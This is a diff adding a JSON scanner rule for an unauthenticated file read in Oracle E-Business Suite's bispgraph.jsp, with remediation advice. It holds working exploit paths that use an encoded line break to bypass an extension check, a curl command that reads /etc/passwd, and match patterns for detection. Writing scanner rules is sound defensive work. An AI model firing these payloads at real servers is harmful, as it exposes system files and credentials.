@@ -1,0 +1,36 @@
+{
+  "id": "injection-oracle-ebs-bispgraph-lfi",
+  "class": "injection",
+  "safety": "read",
+  "severity_floor": "high",
+  "title": "Oracle E-Business Suite bispgraph.jsp reads arbitrary files",
+  "summary": "The bispgraph.jsp endpoint takes a file name and folder and returns the file, so an unauthenticated visitor can read files off the server such as /etc/passwd. The request uses an encoded line break and a .js suffix to get past the extension check. A file read like this leaks configuration and can lead to credentials.",
+  "needs": [],
+  "candidate_paths": [
+    "/OA_HTML/bispgraph.jsp%0D%0A.js?ifn=passwd&ifl=/etc/",
+    "/OA_HTML/bispgraph.jsp%0D%0A.js?ifn=win.ini&ifl=c:/windows/"
+  ],
+  "probe": [
+    {
+      "request": {
+        "method": "GET",
+        "path": "{route}"
+      }
+    }
+  ],
+  "confirm": {
+    "control": "A path that cannot exist, so the site's not found answer is known and a real file read is told apart from a soft 404.",
+    "differential": "status == 200 and ((body_contains(\"root:\") and body_contains(\"bin/bash\")) or body_contains(\"[extensions]\") or body_contains(\"[fonts]\")) and body_differs(control)",
+    "retest": 2
+  },
+  "reproduce": "curl -sk 'https://host/OA_HTML/bispgraph.jsp%0D%0A.js?ifn=passwd&ifl=/etc/' and check the body returns the contents of /etc/passwd (lines with 'root:' and 'bin/bash'). On Windows try ifn=win.ini&ifl=c:/windows/ and look for '[extensions]' or '[fonts]'. A 200 with the file contents proves the read.",
+  "remediate": "Patch Oracle E-Business Suite to a release that fixes the bispgraph.jsp traversal, and block /OA_HTML/bispgraph.jsp with the Oracle E-Business Suite Allowed Resources (URL Firewall) framework so it is not reachable without authentication.",
+  "references": [],
+  "mappings": {
+    "cwe": "CWE-22",
+    "owasp": "A01:2021"
+  },
+  "rulesets": [
+    "oracle-ebs"
+  ]
+}
